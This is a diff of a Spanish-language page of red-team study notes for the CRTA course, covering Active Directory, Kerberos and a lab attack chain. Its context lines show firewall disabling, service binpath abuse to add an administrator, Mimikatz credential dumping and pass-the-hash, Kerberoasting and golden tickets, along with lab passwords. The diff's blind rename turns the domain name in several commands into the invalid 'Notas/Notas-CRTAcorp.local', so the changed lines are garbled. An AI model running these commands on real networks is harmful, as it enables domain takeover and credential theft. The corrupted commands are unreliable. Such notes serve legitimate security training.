@@ -4,25 +4,25 @@ layout: page
 permalink: /Notas_CRTA_Certified_Red_Team_Analyst
 ---
 
-<h2 id="whity">CRTA Certified Red Team Analyst</h2>
+<h2 id="whity">Notas/Notas-CRTA Certified Red Team Analyst</h2>
 
 
 <h2 class="amarillo">Introducción</h2>
 
-EL CRTA es para principiantes en seguridad de la información ofreciendo una experiencia practica. Tendremos un material de estudio, practicas de laboratorio, vídeos y manuales PDF. Este curso es centrado en desarrollar la comprensión de la mentalidad y las tácticas, técnicas y procedimientos TTP empleadas por los agentes de amenaza. Y esta dirigido a aquellos que aspiran a convertirse en profesionales Red Team. Finalizando el curso se tendrán las habilidades y conocimientos esenciales para una trayectoria exitosa en el campo.
+EL Notas/Notas-CRTA es para principiantes en seguridad de la información ofreciendo una experiencia practica. Tendremos un material de estudio, practicas de laboratorio, vídeos y manuales PDF. Este curso es centrado en desarrollar la comprensión de la mentalidad y las tácticas, técnicas y procedimientos TTP empleadas por los agentes de amenaza. Y esta dirigido a aquellos que aspiran a convertirse en profesionales Red Team. Finalizando el curso se tendrán las habilidades y conocimientos esenciales para una trayectoria exitosa en el campo.
 
 <h2 class="amarillo">Proceso de certificación</h2>
 
 Para lograr la certificación se debe:
 
-- Inscribir en el CRTA
+- Inscribir en el Notas/Notas-CRTA
 - Completar el material de estudio [Vídeos + PDF]
 - Programar el acceso al laboratorio de 30 días iniciando sesión en CCSP
 - Programar un espacio de examen de 6 horas a través del portal CCSP
 - Capturar y enviar banderas durante la ventana del examen
 - Obtener el certificado como recompensa
 
-> NO HAY QUE HACER UN INFORME ESCRITO, EL EXAMEN CRTA SE BASA ÚNICAMENTE EN FLAGS
+> NO HAY QUE HACER UN INFORME ESCRITO, EL EXAMEN Notas/Notas-CRTA SE BASA ÚNICAMENTE EN FLAGS
 
 <h2 class="amarillo">Información de acceso al laboratorio</h2>
 
@@ -135,7 +135,7 @@ Si la organización cuenta con algún control como antivirus o firewall, el atac
 - Pueden usar Phishing o explotar servicios remotos (ssh, vncm rdp).
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Description de movimiento lateral desde fuera de una red hasta entrar a la red LAN interna. Esto se debe a que la maquina PC hace parte de la red interna pero esta expuesta afuera de esta haciendo posible que un agente de amenaza pueda hacer todo el recorrido.
@@ -173,7 +173,7 @@ Aquí es cuando encontramos la información critica y el APT tratara de consegui
 Es cuando la información de la organización es extraída por medios físicos o mediante compresión de archivos, dando así concluido el robo de información.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 1.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 1.png" alt="under" oncontextmenu="return false;">
 </div>
 La matrix de MITRE para ayudar a los equipos dentro de las organizaciones a defender sus redes.
 
@@ -186,14 +186,14 @@ Los APT y agentes de amenaza suele intentar muchas técnicas las cuales ya han s
 Aquí conocemos un Command and Control Server que son utilizados por los agentes de amenaza para mantener persistencia en las maquinas que comprometen.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 2.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 2.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Podemos verlo como un APT o un Red Teamer con su C2 para mantener acceso remoto.
 
 Utilizando un C2 Server que contiene unos módulos muy detallados para controlar la Maquina Virtual (Tambien puede ser la de una victima en especifico). Uno de los mejores ejemplos es **Metaesploit (Cobalt Strike).**
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 3.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 3.png" alt="under" oncontextmenu="return false;">
 </div>
 
 El Payload Server permite al APT mover sus scripts hacia el equipo victima de la red interna.
@@ -209,7 +209,7 @@ Un sistema de redirección se encarga de configurar proxies que mueven todo el t
 
 Todo esto es con el fin de que los equipos de incidencias de las organizaciones puedan rastrearnos, sirviendo asi los proxies como intermediarios entre el C2 del APT y la red de la victima.
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 4.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 4.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Pueden existir 10, 15 Redirector servers para el APT poder esconderse y mantenerse anonymous.
@@ -222,7 +222,7 @@ Pueden existir 10, 15 Redirector servers para el APT poder esconderse y mantener
 - Vulnerabilidad: Es cuando el loop-hole esta en un software en particular o en el hardware, por lo tanto es llamado loop-hole. Aunque también puede entenderse como el eslabón mas débil que un APT utiliza para comprometer un sistema.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 5.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 5.png" alt="under" oncontextmenu="return false;">
 </div>
 Se hace uso de la vulnerabilidad web (Nivel de Software) que permite al APT abusar y lograr acceso al host.
 
@@ -271,7 +271,7 @@ Esta es la fase que se realiza una vez se ha identificado una vulnerabilidad.
 - Si el exploit se acontece con éxito, el código del payload se ejecutara.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 6.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 6.png" alt="under" oncontextmenu="return false;">
 </div>
 Este es todo el proceso de explotación que haría un Red Teamer o un APT, una vez hallada una vulnerabilidad esta se explota por un mala configuración o lo que sea “Exploit”, mediante el Exploit se puede inyectar el Payload con las instrucciones maliciosas.
 
@@ -300,7 +300,7 @@ La importancia de las Shells recaen en las Reverse Shell, hablando entonces de a
 - Necesitamos tener un LISTENER activo en la maquina atacante.
 - Una de las mejores herramientas para entablar este tipo de conexiones es netcat = nc.
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 7.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 7.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Imagen de la Reverse Shell donde el atacante abre el puerto y recibe una conexión por parte de la maquina servidor.
@@ -315,7 +315,7 @@ Las Bind Shells son especiales
 - Esta shell puede ser usada para expandir el compromiso del servidor.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 8.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 8.png" alt="under" oncontextmenu="return false;">
 </div>
 
 El agente de amenaza se conecta directamente al servidor por el puerto abierto.
@@ -325,7 +325,7 @@ El agente de amenaza se conecta directamente al servidor por el puerto abierto.
 Aquí se abordaran las tecnologías que son usadas a nivel de compañías y organizaciones, también sobre Directorio Activo y como todo se gestiona en una empresa a nivel de infraestructura.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/zone.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/zone.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Infraestructura de una empresa, donde el Red Team o los APT hacen su cosas. Luego tenemos la DMZ que puede contar con servicios de correo electrónico o web servers (los cuales son públicos y accesibles desde internet), la red de la empresa LAN y la MZ.
@@ -365,7 +365,7 @@ Retomando entonces al gráfico inicial sobre el ambiente empresarial, vemos que 
 
 **Uniform Resource Locators** es el acrónimo de URL.
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 9.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 9.png" alt="under" oncontextmenu="return false;">
 </div>
 
 El Bastion Server suele estar entre un Firewall y el acceso al servidor DB con los usuarios con altos privilegios.
@@ -380,7 +380,7 @@ El directorio activo como su nombre lo sugiere es un directorio (o base de datos
 - Otorga una administración centralizada de recursos digitales.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 10.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 10.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Es una tecnología muy utilizada en empresas porque permite fácilmente manejar información, data, y usuarios de forma centralizada.
@@ -399,7 +399,7 @@ Hay 4 grupos de los cuales es importante hablar al mencionar el Directorio Activ
 Los recursos computacionales son descritos dentro del Forest. (Puede contener muchos equipos o redes).
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 11.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 11.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Representación de un DC Domain Controller 1 dentro del Forest.
@@ -423,7 +423,7 @@ Representación de un DC Domain Controller 1 dentro del Forest.
     - Tickets usados específicamente para autorización.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 12.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 12.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Hay una serie de grupos privilegiados dentro del Directorio Activo
@@ -454,19 +454,19 @@ En especial los TGS que pueden ser usados para acceder a un servicio especifico 
 Nada se guarda en disco sobre los Tickets, todo es en memoria.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 13.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 13.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Primer paso de autenticación con Kerberos, la solicitud del TGT
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 14.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 14.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Segundo paso de autenticacion con Kerberos, recibir el TGT
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 15.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 15.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Tercer paso de autenticación con Kerberos, solicitud del TGS
@@ -474,14 +474,14 @@ Tercer paso de autenticación con Kerberos, solicitud del TGS
 Segundo paso de autenticacion con Kerberos, recibir el TGT
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 16.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 16.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Cuarto paso de autenticación con Kerberos, uso y validación del TGS
 
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 17.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 17.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Todo el flujo que debe hacer un usuario dentro del Active Directory para solicitar acceso a un servicio corriendo dentro de su dominio, en este caso el acceso a un servidor SQL utilizando la autenticación Kerberos con TGT y TGS
@@ -497,7 +497,7 @@ Permite a que las credenciales de un usuario autenticado puedan ser reutilizadas
 - La cuenta de aplicación de servicio debe ser de confianza para la Delegation para poder hacer las solicitudes como el usuario autenticado de dominio.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 18.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 18.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Kerberos Delegation, donde la Application Server si autentica con las credenciales del Domain User a la Database Server
@@ -521,19 +521,19 @@ Los dominios de confianza representan relaciones entre 2 dominios o bosques (For
 - La confianza ayuda a identificar las entidades en un dominio o en un Forest.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 19.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 19.png" alt="under" oncontextmenu="return false;">
 </div>
 
 **One Way Trust** donde un dominio tiene usuarios que requieren de acceder a algún tipo de recurso que se encuentra en otro dominio, entonces el dominio que presta el servicio establece una relación de confianza con el **Dominio que requiere sus servicios**, ya de esta forma el dominio de confianza puede solicitar acceso a los recursos que necesita.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 20.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 20.png" alt="under" oncontextmenu="return false;">
 </div>
 
 **Two Way Trust** donde ambos dominios tienen usuarios y recursos que requieren de acceso bidireccional, por tanto entre ambos dominios se puede acceder a recursos.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 21.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 21.png" alt="under" oncontextmenu="return false;">
 </div>
 
 **Parent-Child Trust**, la relación entre los dominios permite administración de todos los recursos de la organización, por ejemplo el **Child Domain** administra **(Marketing, Sales, Management)** y el **Parent Domain** administra todo el dominio como tal
@@ -543,13 +543,13 @@ La diferencia es que el paso 5, donde el Domain User solicita el TGS no se lo pe
 - Esto se debe a que el Application Server no esta dentro del alcance del Child Domain, pero si lo esta del Parent Domain.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 22.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 22.png" alt="under" oncontextmenu="return false;">
 </div>
 
 **External Trust**, es cuando un árbol A no confía en un árbol B, entonces la confianza es establecida entre un dominio de un árbol puede ser Bidireccional, unidireccional y por supuesto la confianza con el padre **Parent Child Trust**.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 23.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 23.png" alt="under" oncontextmenu="return false;">
 </div>
 
 **Forest Trust**, dentro de cada Forest hay un Active Directory, no hay mucho que decir, mas allá de que cada Forest confía en el otro de forma mutua, por tanto hay acceso entre todos los dispositivos pasando por cada Active Directory de los Forests
@@ -568,13 +568,13 @@ La autorización significa que un usuario es específicamente permitido o negado
 object es un identificador llamado identificador de seguridad (SID) que es único para cada usuario o grupo de seguridad.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 24.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 24.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Fundamentos de Autorización, el token de seguridad es generado cada vez que el usuario inicia sesión (La información del token valida los derechos de un usuario a nivel de red, y los grupos ya que puede tener algún grupo privilegiado y se le deben respetar los permisos del grupo al que pertenezca), y el Individual SID es único por usuario.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 25.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 25.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Validación del Token con el DACL para el acceso de usuarios con recursos compartidos a nivel de red dentro del Active Directory. Importante que el ACE Access Control Entities guarda la información de IDS para acceso a recursos.
@@ -643,7 +643,7 @@ virsh net-list --all
 Primero comenzaremos con el esquema del laboratorio:
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 26.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 26.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Tenemos un servicio web expuesto y una red interna controlada por un Active Directory
@@ -688,11 +688,11 @@ Para el usuario adminitrator:Password1
 
 Para el usuario app-svc:Password2
 
-- Un nombre de dominio crtacorp.local
+- Un nombre de dominio Notas/Notas-CRTAcorp.local
 - Directory Services Restore Mode (superp4ssw0rd123!#)
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 27.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 27.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Para listar la información de los usuarios existentes dentro del dominio podemos usar **net user /domain**
@@ -832,7 +832,7 @@ PORTFORWARDING TECHNIQUE
 ssh -D 8090 creara un socket en nuestra maquina que establecerá una conexión en nuestro puerto 8090 y actuara como puerta de enlace (gateway), por tanto, todo input enviado a la 8090 viajara al ssh.
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 28.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 28.png" alt="under" oncontextmenu="return false;">
 </div>
 
 ```bash
@@ -840,7 +840,7 @@ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.
 ```
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 29.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 29.png" alt="under" oncontextmenu="return false;">
 </div>
 
 Ahora lo que sigue es modificar el archivo /etc/proxychains.conf
@@ -852,7 +852,7 @@ socks4 127.0.0.1 8090
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 30.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 30.png" alt="under" oncontextmenu="return false;">
 </div>
 
 # **Red Team en ambientes internos**
@@ -891,14 +891,14 @@ $ie = New-Object -ComObject InternetExplorer.Application;$ie.visible=$false;$ie.
 
 #Dominios
 Get-NetDomain
-Get-NetDomain -Domain crtacorp.local
-Get-NetDomainController -Domain crtacorp.local Get-DomainSID
+Get-NetDomain -Domain Notas/Notas-CRTAcorp.local
+Get-NetDomainController -Domain Notas/Notas-CRTAcorp.local Get-DomainSID
 net user /domain
 net user
 ```
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 31.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 31.png" alt="under" oncontextmenu="return false;">
 </div>
 
 ```powershell
@@ -921,7 +921,7 @@ Get-NetComputer -Verbose | Select-Object dnshostname
 #Traer todos los grupos del dominio
 Get-NetGroup
 Get-NetGroup -FullData
-Get-NetGroup -Domain crtacorp.local
+Get-NetGroup -Domain Notas/Notas-CRTAcorp.local
 #Enumerar privilegios de domain group members y local administrators
 Get-NetGroupMember -GroupName "Domain Admins" -verbose
 Get-NetLocalGroup -ComputerName DC-01 -ListGroups
@@ -929,7 +929,7 @@ Get-NetLocalGroup -ComputerName DC-01 -ListGroups
 Get-ObjectAcl -SamAccountName <domain-user> -ResolveGUIDs
 Invoke-ACLScanner -ResolveGUIDs
 #Enumearcion de dominos de confianza
-Get-NetDomianTrust -Domain crtacorp.local
+Get-NetDomianTrust -Domain Notas/Notas-CRTAcorp.local
 #Enumeraceion de todos los dominos en un Forest
 Get-NetForestDomain -Verbose
 Get-NetForest -Verbose
@@ -968,7 +968,7 @@ net localgroup administrators
 
 #SNMPTRAP ABUSE
 sc.exe qc snmptrap
-sc.exe config snmptrap binpath="net localgroup administrators crtacorp.local\employee /add"
+sc.exe config snmptrap binpath="net localgroup administrators Notas/Notas-CRTAcorp.local\employee /add"
 Restart-Service snmptrap -Verbose
 
 ```
@@ -1008,7 +1008,7 @@ Invoke-Mimikatz -DumpCreds -Verbose -> ser Administrador
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:app-svc /domain:cyberwarfare.corp /rc4:<ntlm-hash> /run:powershell.exe"'
 
 #Kerberoasting
-setspn -T crtacorp.local -Q */*
+setspn -T Notas/Notas-CRTAcorp.local -Q */*
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""
 kerberos::list /export
@@ -1034,7 +1034,7 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 python tgsrepcrack.py 10k-worst-pass.txt tgs.kirbi
 ```
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 32.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 32.png" alt="under" oncontextmenu="return false;">
 </div>
 
 ## Lateral Movement
@@ -1081,7 +1081,7 @@ net user app-svc /domain -> es domain admin
 #Revisar acceso local al Domain Controller
 ..\PowerView_dev.ps1
 Get-NetDomainController -Verbose
-Invoke-CheckLocalAdminAccess -ComputerName DC-01.crtacorp.local -Verbose
+Invoke-CheckLocalAdminAccess -ComputerName DC-01.Notas/Notas-CRTAcorp.local -Verbose
 
 ```
 
@@ -1121,7 +1121,7 @@ Requerimientos:
 - SIDS in cross forest attacks
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 33.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 33.png" alt="under" oncontextmenu="return false;">
 </div>
 
 ```powershell
@@ -1138,7 +1138,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwar
 ```
 
 <div style="text-align: center;">
-  <img src="/assets/images/CRTA/image 34.png" alt="under" oncontextmenu="return false;">
+  <img src="/assets/images/Notas/Notas-CRTA/image 34.png" alt="under" oncontextmenu="return false;">
 </div>
 
 SILVER TICKET ATTACK
